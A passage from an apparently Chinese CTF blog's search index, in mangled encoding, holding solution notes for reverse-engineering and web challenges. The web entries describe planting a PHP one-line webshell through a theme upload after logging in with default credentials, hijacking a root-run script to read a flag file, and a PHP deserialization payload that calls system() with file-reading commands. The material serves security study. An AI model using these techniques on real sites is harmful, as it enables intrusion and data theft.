alt="image-20210719221315669"></p><p>è€Œdword_40C9BDçš„è®¡ç®—æ–¹å¼è·Ÿjmpåç§»åœ°å€çš„è®¡ç®—æ–¹å¼ååˆ†ç±»ä¼¼ã€‚<br>å³åç§»åœ°å€=ç›®æ ‡åœ°å€-å½“å‰åœ°å€-5ã€‚ï¼ˆ5ä¸ºE9 xxxxxxxxè¿™æ¡æŒ‡ä»¤çš„é•¿åº¦ï¼‰</p><blockquote><p>åç§»åœ°å€=ç›®æ ‡åœ°å€-ä¸‹ä¸€è¡ŒæŒ‡ä»¤åœ°å€<br>ã€Šæ±‡ç¼–è¯­è¨€ã€‹P180ã€‚åœ¨8086ä¸Š JMPæŒ‡ä»¤é•¿åº¦ä¸º2</p></blockquote><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221336278.png" alt="image-20210719221336278"></p><p>è¿™ä¿©å˜é‡åœ¨åœ°å€ä¸Šè¿˜æ˜¯è¿ç»­</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221411766.png" alt="image-20210719221411766"></p><p>çœŸæ­£çš„åŠ å¯†å‡½æ•°</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-EASYHOOK/image-20210719221420596.png" alt="image-20210719221420596"></p><p>è¯¶ï¼Œç¬”è®°åšåˆ°è¿™å°±æ–­äº†ï¼Œå¿˜äº†å½“æ—¶åœ¨å¹²å˜›äº†ï¼Œç®—äº†ï¼Œç•™ä¸ª</p><p>TODO:è¡¥å……æ­¤é¢˜åç»­</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:EasyRE</title>
      <link href="/p/1298802665.html"/>
      <url>/p/1298802665.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰åšçš„é¢˜ï¼Œå¿˜äº†å‡ºå¤„äº†</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EasyRE/image-20210719220559117.png" alt="image-20210719220559117"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EasyRE/image-20210719220554818.png" alt="image-20210719220554818"></p><p>è¿™ç‚¹æ³¨æ„ã€‚7F=127ï¼Œè½¬åŒ–å­—ç¬¦ä¸²çš„æ—¶å€™æˆªæ–­äº†ï¼Œæ‰€ä»¥å­—ç¬¦ä¸²å¹¶ä¸å®Œæ•´ï¼Œéœ€è¦åŠ ä¸Šåé¢çš„ã€‚<br>è€Œä¸”ä»åé¢ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œå‰é¢åº”è¯¥æ˜¯ä¸€ä½“çš„ï¼Œå†åŠ ä¸Šchr(127) å¹¶æ²¡æœ‰è¿™ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥ç”±æ­¤æ¨æ–­å­—ç¬¦ä¸²æ˜¯è¢«æˆªæ–­äº†ã€‚</p><p>è¿™ç‚¹å¹¶æ²¡æœ‰ä»€ä¹ˆå®åœ¨çš„é€»è¾‘ï¼Œæ›´åå‘äºçµå…‰ä¸€é—ªçš„æƒ³æ³•ã€‚ä¸è¦æ€»æ˜¯æ‹˜æ³¥äº1+1=2ï¼Œä¹Ÿè¦ç•™æ„è§‚å¯Ÿå…¶ä»–ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">v <span class="token operator">=</span> <span class="token string">'xIrCj~&lt;r|2tWsv3PtI'</span>v <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">)</span>v<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span>v <span class="token operator">+=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">,</span> <span class="token string">'zndka'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>flag<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[tinyctf-2014]elrond32</title>
      <link href="/p/3359042898.html"/>
      <url>/p/3359042898.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰åšçš„é¢˜</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220253732.png" alt="image-20210719220253732"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220301513.png" alt="image-20210719220301513"></p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>è¿™é¢˜ä¸éš¾ï¼Œç†æ¸…é€»è¾‘å°±å¥½ï¼Œ<br>ç©ºæƒ³æƒ³äº†åŠå¤©ï¼Œä¸å¦‚åŠ¨ç¬”åœ¨çº¸ä¸Šå†™å†™ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220315205.png" alt="image-20210719220315205"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220319474.png" alt="image-20210719220319474"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220324453.png" alt="image-20210719220324453"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-tinyctf-2014-elrond32/image-20210719220328610.png" alt="image-20210719220328610"></p><p>ç®€å•ç®€å•ï¼Œå°±æ˜¯ç†æ¸…é€»è¾‘è´¹æ—¶é—´ï¼Œä¸‹æ¬¡è¦åŠ å¿«æ€è€ƒé€Ÿåº¦äº†ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span>v <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'d'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'g'</span><span class="token punctuation">,</span> <span class="token string">'s'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">def</span> <span class="token function">dd</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">global</span> flag    <span class="token keyword">if</span> i <span class="token keyword">not</span> <span class="token keyword">in</span> n<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"over"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span>        flag <span class="token operator">+=</span> v<span class="token punctuation">[</span>n<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">return</span> dd<span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">*</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">11</span><span class="token punctuation">)</span>dd<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x0000000F</span><span class="token punctuation">,</span> <span class="token number">0x0000001F</span><span class="token punctuation">,</span> <span class="token number">0x00000004</span><span class="token punctuation">,</span> <span class="token number">0x00000009</span><span class="token punctuation">,</span> <span class="token number">0x0000001C</span><span class="token punctuation">,</span> <span class="token number">0x00000012</span><span class="token punctuation">,</span> <span class="token number">0x00000042</span><span class="token punctuation">,</span> <span class="token number">0x00000009</span><span class="token punctuation">,</span> <span class="token number">0x0000000C</span><span class="token punctuation">,</span> <span class="token number">0x00000044</span><span class="token punctuation">,</span> <span class="token number">0x0000000D</span><span class="token punctuation">,</span> <span class="token number">0x00000007</span><span class="token punctuation">,</span> <span class="token number">0x00000009</span><span class="token punctuation">,</span> <span class="token number">0x00000006</span><span class="token punctuation">,</span> <span class="token number">0x0000002D</span><span class="token punctuation">,</span> <span class="token number">0x00000037</span><span class="token punctuation">,</span>     <span class="token number">0x00000059</span><span class="token punctuation">,</span> <span class="token number">0x0000001E</span><span class="token punctuation">,</span> <span class="token number">0x00000000</span><span class="token punctuation">,</span> <span class="token number">0x00000059</span><span class="token punctuation">,</span> <span class="token number">0x0000000F</span><span class="token punctuation">,</span> <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token number">0x0000001C</span><span class="token punctuation">,</span> <span class="token number">0x00000023</span><span class="token punctuation">,</span> <span class="token number">0x00000036</span><span class="token punctuation">,</span> <span class="token number">0x00000007</span><span class="token punctuation">,</span> <span class="token number">0x00000055</span><span class="token punctuation">,</span> <span class="token number">0x00000002</span><span class="token punctuation">,</span> <span class="token number">0x0000000C</span><span class="token punctuation">,</span> <span class="token number">0x00000008</span><span class="token punctuation">,</span> <span class="token number">0x00000041</span><span class="token punctuation">,</span> <span class="token number">0x0000000A</span><span class="token punctuation">,</span> <span class="token number">0x00000014</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>t<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[XCTF-4th-WHCTF-2017]BABYRE</title>
      <link href="/p/2988976701.html"/>
      <url>/p/2988976701.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰åšçš„é¢˜ï¼Œæ•´ç†ä¸‹æ”¾blogä¸Š</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210326201322598_8856.png"></p><p>judgeæ— æ³•åç¼–è¯‘ï¼Œæ‰€ä»¥åŠ è¿‡å¯†æˆ–è€…æœ‰èŠ±æŒ‡ä»¤</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210326201500918_5365.png"><br>è¿™é‡Œçš„0xCuçš„uæ˜¯unsignedçš„æ„æ€<br>ç„¶åå¾—æ‰¾åˆ°judgeå‡½æ•°çš„åœ°å€<br>æœ‰ä¸¤ç§æ–¹æ³•ï¼Œ1.åŠ¨æ€è°ƒè¯•/GDBï¼›2.ç›´æ¥ç¿»<br><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210326202018083_6226.png"><br>7.0ç›´æ¥çœ‹åˆ°</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210326202043985_12175.png"><br>7.5ä¸æ˜¾ç¤ºè¿™ä¸ªå‡½æ•°ï¼Œä½†å¯ä»¥ç›´æ¥è·³è½¬è¿‡å»</p><p>æˆ–è€…æŠŠæ•°ç»„è§£å¯†ä¸€ä¸‹<br><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210326234906342_12620-1626703087202.png"></p><p>ç„¶åä¾æ¬¡æŒ‰<br>U å–æ¶ˆå®šä¹‰<br>C åæ±‡ç¼–<br>P ç”Ÿæˆå‡½æ•°</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210327000418688_11093.png"></p><p>judgeä»£ç å°±å‡ºæ¥äº†ï¼Œä¸è¿‡è¿™é“é¢˜è¿˜æ˜¯7.0ç‰ˆç”Ÿæˆçš„ä¼ªä»£ç æ¼‚äº®ç‚¹ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-XCTF-4th-WHCTF-2017-BABYRE/20210327000358991_5191.png"><br>flag{n1c3_j0b}</p>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[2019UNCTF]666</title>
      <link href="/p/453793400.html"/>
      <url>/p/453793400.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æŒºç®€å•çš„ï¼Œè€ƒçš„é€†å‘æ€ç»´ï¼Œæˆ‘ä¹Ÿåšçš„æ¥äº†ã€‚å¥½è€¶</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python">enflag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span>          <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">18</span>key <span class="token operator">=</span> <span class="token number">18</span>v3 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">32</span>v4 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">32</span>v5 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">40</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># v5[i] = enflag[i]</span>    <span class="token comment"># v4[i + 1] = enflag[i + 1]</span>    <span class="token comment"># v3[i + 2] = enflag[i + 2]</span>    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>enflag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">6</span>    flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>enflag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">6</span>    flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>enflag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">^</span> key<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">6</span>    <span class="token comment"># åŠ å‡ä¼˜å…ˆçº§æ¯”å¼‚æˆ–è¦é«˜</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Reverse </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[GKCTF2020]è€å…«å°è¶…å¸‚å„¿</title>
      <link href="/p/854902497.html"/>
      <url>/p/854902497.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF/image-20210720193024786.png" alt="image-20210720193024786"></p><p>é»˜è®¤åå°/admin.php<br>é»˜è®¤è´¦æˆ·admin<br>é»˜è®¤å¯†ç shopxo</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>è¿›åå°ï¼Œè¿™ç§ç¬¬ä¸€æ—¶é—´è€ƒè™‘ä¸»é¢˜æ›¿æ¢ï¼Œ<br>åœ¨ç½‘ä¸Šä¸‹è½½äº†ä¸ªä¸»é¢˜ï¼Œç„¶åæŠŠä¸€å¥è¯phpæ‰”è¿›å»</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF/image-20210720193041439.png" alt="image-20210720193041439"></p><p>è·¯å¾„</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;c09edc10-f98b-46fc-bac8-474ba55b4e1b.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;images&#x2F;default-user-avatar.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>èšå‰‘è®¿é—®</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;c09edc10-f98b-46fc-bac8-474ba55b4e1b.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flagåœ¨/rootå¤„ï¼Œä½†æƒé™ä¸å¤Ÿï¼Œæ²¡æ³•ææƒã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GKCTF2020-%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF/image-20210720193116374-1626780676838.png" alt="image-20210720193116374"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> io<span class="token keyword">import</span> timeos<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"whoami"</span><span class="token punctuation">)</span>gk1<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gk<span class="token operator">=</span><span class="token string">"\nGet The RooT,The Date Is Useful!"</span>f<span class="token operator">=</span>io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/flag.hint"</span><span class="token punctuation">,</span> <span class="token string">"rb+"</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>gk1<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>gk<span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŠ ä¸ªä¸€è¡Œ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span>io<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/root/flag"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ç»“æŸ</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]phpweb</title>
      <link href="/p/3140926844.html"/>
      <url>/p/3140926844.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»¥å‰åšçš„é¢˜</p><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/image-20210720191114494.png" alt="image-20210720191114494"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/image-20210720191117805.png" alt="image-20210720191117805"></p><p>çŒœæµ‹ä½¿ç”¨äº†<code>call_user_func()</code></p><pre class="line-numbers language-none"><code class="language-none">$result &#x3D; call_user_func($func, $p);$func &#x3D; $_REQUEST[&quot;func&quot;];$p &#x3D; $_REQUEST[&quot;p&quot;];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>è¯»å–æºç <code>func=file_get_contents&amp;p=index.php</code></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/image-20210720191215127.png" alt="image-20210720191215127"></p><p>ååºåˆ—åŒ–å¯è¡Œ</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb/image-20210720191226492.png" alt="image-20210720191226492"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php<span class="token keyword">class</span> <span class="token class-name">Test</span><span class="token punctuation">&#123;</span>    var $p <span class="token operator">=</span> <span class="token string">"/flag.php"</span><span class="token punctuation">;</span>    var $func <span class="token operator">=</span> <span class="token string">"readfile"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>$a <span class="token operator">=</span> new Test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>echo serialize<span class="token punctuation">(</span>$a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#$a->p = 'ls ../../../';</span><span class="token comment">#$a->p ="find / -name 'flag*'";</span>$a<span class="token operator">-</span><span class="token operator">></span>p <span class="token operator">=</span> <span class="token string">'cat /tmp/flagoefiu4r93'</span><span class="token punctuation">;</span>$a<span class="token operator">-</span><span class="token operator">></span>func <span class="token operator">=</span> <span class="token string">'system'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[å®‰æ´µæ¯ 2019]easy_serialize_php</title>
      <link href="/p/2255249959.html"/>
      <url>/p/2255249959.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$function</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$filter_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string 